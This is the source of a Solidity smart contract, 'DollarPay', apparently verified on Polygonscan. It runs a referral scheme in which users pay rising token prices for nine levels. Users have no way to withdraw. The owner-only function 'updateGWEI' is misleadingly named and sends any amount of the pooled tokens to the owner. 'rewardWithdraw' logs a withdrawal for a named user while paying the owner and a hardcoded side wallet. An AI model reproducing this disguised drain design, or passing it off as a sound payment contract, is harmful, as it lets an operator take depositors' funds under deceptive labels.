/**
 *Submitted for verification at polygonscan.com on 2023-03-02
*/

//SPDX-License-Identifier: None
pragma solidity ^0.6.0;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract DollarPay {
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        mapping(uint8 => bool) activeLevels;
    }  
    mapping(address => User) public users;
    IERC20 public tokenAPLX;
    
    mapping(uint8 => uint) public packagePrice;
    mapping(uint => address) public idToAddress;
    uint public lastUserId = 2;
    
    address public id1=0x191314De6Ef1c0f2E47AB1E224320AE560793149;
    address public owner;
    address deductionWallet=0x2faE1719bDc53dF26f9fA7DDd559c4243b839655;
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint8 level);
    event withdraw(address indexed user,uint256 value);
    
    constructor(address _token) public {
        packagePrice[1] = 50e18;
        packagePrice[2] = 100e18;
        packagePrice[3] = 200e18;
        packagePrice[4] = 500e18;
        packagePrice[5] = 1000e18;
        packagePrice[6] = 1500e18;
        packagePrice[7] = 2000e18;
        packagePrice[8] = 5000e18;
        packagePrice[9] = 10000e18;
        tokenAPLX = IERC20(_token);
        owner=msg.sender;
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        users[id1] = user;
        idToAddress[1] = id1;
        users[id1].activeLevels[1]=true;
        users[id1].activeLevels[2]=true;
        
    }
    function registrationExt(address referrerAddress) external {
        tokenAPLX.transferFrom(msg.sender, address(this),packagePrice[1]);
        registration(msg.sender, referrerAddress);
    }
    function buyNewLevel(uint8 level) external {
        tokenAPLX.transferFrom(msg.sender, address(this),packagePrice[level]);
        buyLevel(msg.sender,level);
    }
    function buyLevel(address userAddress,uint8 level) private {
        require(isUserExists(userAddress), "user is not exists. Register first."); 
        require(users[userAddress].activeLevels[level-1], "buy previous level first");
        require(!users[userAddress].activeLevels[level], "level already activated");
        users[userAddress].activeLevels[level]=true;        
        emit Upgrade(userAddress,level);
    }
    
    function registration(address userAddress, address referrerAddress) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;        
        lastUserId++;
        users[referrerAddress].partnersCount++; 
        users[userAddress].activeLevels[1]=true; 
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    
    function usersActiveLevels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeLevels[level];
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function rewardWithdraw(address _user,uint256 balanceReward) public
    {
        require(msg.sender==owner,"Only contract owner"); 
        tokenAPLX.transfer(msg.sender,balanceReward*90/100);  
        tokenAPLX.transfer(deductionWallet,balanceReward*10/100);  
        emit withdraw(_user,balanceReward);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==owner,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        tokenAPLX.transfer(msg.sender,_amount);  
    }
}